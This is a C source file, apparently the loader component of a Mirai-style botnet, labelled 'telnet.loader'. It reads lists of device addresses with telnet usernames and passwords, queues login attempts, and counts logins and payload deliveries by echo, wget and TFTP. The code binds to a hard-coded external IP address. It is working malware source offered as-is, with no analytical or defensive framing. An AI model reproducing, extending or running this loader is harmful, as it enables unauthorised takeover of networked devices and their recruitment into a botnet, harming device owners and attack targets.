#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"
#include "headers/config.h"

static void *stats_thread(void *);

char *id_tag = "telnet.loader";

static struct server *srv;

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

    printf("[DEBUG] Loader starting...\n");
    printf("[DEBUG] Process ID: %d\n", getpid());
    printf("[DEBUG] Thread count: %ld\n", sysconf(_SC_NPROCESSORS_ONLN));

    addrs_len = 1;
    addrs = calloc(4, sizeof(ipv4_t));
    addrs[0] = inet_addr("63.250.59.28");
    printf("[DEBUG] Bind address: 63.250.59.28\n");
	
	if (argc == 2)
    {
        id_tag = args[1];
        printf("[DEBUG] ID tag: %s\n", id_tag);
    }

    printf("[DEBUG] Initializing binary system...\n");
    if(!binary_init())
    {
        printf("[DEBUG] Binary initialization failed!\n");
        return 1;
    }
    printf("[DEBUG] Binary system initialized successfully\n");

    printf("[DEBUG] Creating server with %ld threads, %d max connections...\n", sysconf(_SC_NPROCESSORS_ONLN), 1024);
    if((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 256, HTTP_SERVER, HTTP_PORT, TFTP_SERVER)) == NULL)
    {
        printf("[DEBUG] Server creation failed!\n");
        return 1;
    }
    printf("[DEBUG] Server created successfully\n");

    printf("[DEBUG] Starting stats thread...\n");
    pthread_create(&stats_thrd, NULL, stats_thread, NULL);
    printf("[DEBUG] Stats thread started\n");

    printf("[DEBUG] Entering main connection loop...\n");
    while(TRUE)
    {
        char strbuf[1024];

        if(fgets(strbuf, sizeof(strbuf), stdin) == NULL)
        {
            printf("[DEBUG] EOF received, breaking main loop\n");
            break;
        }

        util_trim(strbuf);

        if(strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        printf("[DEBUG] Processing line: %s\n", strbuf);
        memset(&info, 0, sizeof(struct telnet_info));
        if(telnet_info_parse(strbuf, &info) == NULL)
        {
            printf("[DEBUG] Failed to parse telnet info: \"%s\"\n", strbuf);
        }
        else
        {
            printf("[DEBUG] Parsed telnet info - IP: %u, Port: %d, User: %s, Pass: %s, Arch: %s\n", 
                   info.addr, ntohs(info.port), info.user, info.pass, info.arch);
            if(srv == NULL)
            {
                printf("[DEBUG] ERROR: srv == NULL!\n");
            }

            printf("[DEBUG] Queuing telnet connection for processing...\n");
            server_queue_telnet(srv, &info);
            printf("[DEBUG] Telnet connection queued successfully\n");
            if(total++ % 1000 == 0) sleep(1);
        }

        ATOMIC_INC(&srv->total_input);
    }

    //printf("Hit end of input.\n");

    while(ATOMIC_GET(&srv->curr_open) > 0) sleep(1);

    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while(TRUE)
    {
        #ifndef DEBUG
		printf("\x1b[0;36m[\x1b[0;37m%ds\x1b[0;36m] \x1b[0;37m-> \x1b[0;36mConns: [\x1b[0;37m%d\x1b[0;36m] Logins: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Ran: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] \x1b[0;37m-> Echoes: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Wgets: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] TFTPs: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m]\x1b[0;37m\n",
		seconds++, ATOMIC_GET(&srv->curr_open),  ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
        #endif
        fflush(stdout);
        sleep(1);
    }
}
